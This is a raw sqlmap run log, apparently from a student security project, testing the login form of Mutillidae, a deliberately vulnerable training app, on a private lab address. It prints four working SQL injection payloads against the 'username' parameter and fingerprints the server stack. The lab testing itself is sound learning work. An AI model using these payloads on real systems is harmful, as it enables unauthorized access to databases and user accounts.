@@ -1,0 +1,114 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.9#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:56:54 /2026-04-02/
+
+[12:56:54] [WARNING] using '/home/kali/FYP-1/results/shahrukh/http:__192-168-78-102_mutillidae_index-php?page=login-php_20260402_125548/sqlmap_data' as the output directory
+[12:56:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[12:56:54] [INFO] starting crawler for target URL 'http://192.168.78.102/mutillidae/index.php?page=login.php'
+[12:56:54] [INFO] searching for links with depth 1
+[12:56:54] [INFO] starting 2 threads
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[12:56:55] [INFO] found a total of 2 targets
+[1/2] Form:
+POST http://192.168.78.102/mutillidae/index.php?page=login.php
+Cookie: PHPSESSID=967fda3f406d67fb094a8c287962f1cc
+POST data: username=&password=&login-php-submit-button=Login
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: username=&password=&login-php-submit-button=Login] (Warning: blank fields detected): username=&password=&login-php-submit-button=Login
+do you want to fill blank fields with random values? [Y/n] Y
+[12:56:55] [INFO] using '/home/kali/FYP-1/results/shahrukh/http:__192-168-78-102_mutillidae_index-php?page=login-php_20260402_125548/sqlmap_data/results-04022026_1256pm.csv' as the CSV results file in multiple targets mode
+[12:56:55] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:56:55] [INFO] testing if the target URL content is stable
+[12:56:56] [INFO] target URL content is stable
+[12:56:56] [INFO] testing if POST parameter 'username' is dynamic
+[12:56:56] [WARNING] POST parameter 'username' does not appear to be dynamic
+[12:56:56] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[12:56:57] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[12:56:57] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[12:56:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:56:57] [WARNING] reflective value(s) found and filtering out
+[12:56:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[12:56:58] [INFO] testing 'Generic inline queries'
+[12:56:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[12:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+got a 302 redirect to 'http://192.168.78.102/mutillidae/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[12:57:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[12:57:05] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="rid")
+[12:57:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[12:57:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[12:57:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[12:57:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[12:57:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[12:57:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[12:57:06] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[12:57:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[12:57:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:57:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:57:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[12:57:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[12:57:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[12:57:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[12:57:06] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:57:06] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[12:57:06] [INFO] POST parameter 'username' is 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
+[12:57:06] [INFO] testing 'MySQL inline queries'
+[12:57:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[12:57:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[12:57:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[12:57:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[12:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[12:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[12:57:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[12:57:17] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[12:57:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:57:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[12:57:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:57:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[12:57:17] [INFO] target URL appears to have 5 columns in query
+[12:57:18] [INFO] POST parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[12:57:18] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 140 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=Ujki' OR NOT 9486=9486#&password=zoAU&login-php-submit-button=Login
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: username=Ujki' OR ROW(9483,2896)>(SELECT COUNT(*),CONCAT(0x71786a7a71,(SELECT (ELT(9483=9483,1))),0x716b7a7171,FLOOR(RAND(0)*2))x FROM (SELECT 9241 UNION SELECT 3537 UNION SELECT 6312 UNION SELECT 3911)a GROUP BY x)-- uoVd&password=zoAU&login-php-submit-button=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=Ujki' AND (SELECT 7656 FROM (SELECT(SLEEP(5)))cvXx)-- asNa&password=zoAU&login-php-submit-button=Login
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: username=Ujki' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x56497541726576764c65716d52506c536443446a6f724c516b5a73546f6b654e516a576f414a6f48,0x716b7a7171),NULL,NULL,NULL#&password=zoAU&login-php-submit-button=Login
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[12:57:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 4.1
+SQL injection vulnerability has already been detected against '192.168.78.102'. Do you want to skip further tests involving it? [Y/n] Y
+[12:57:18] [INFO] skipping 'http://192.168.78.102/mutillidae/index.php?page=login.php'
+[12:57:18] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/FYP-1/results/shahrukh/http:__192-168-78-102_mutillidae_index-php?page=login-php_20260402_125548/sqlmap_data/results-04022026_1256pm.csv'
+[12:57:18] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:57:18 /2026-04-02/
+
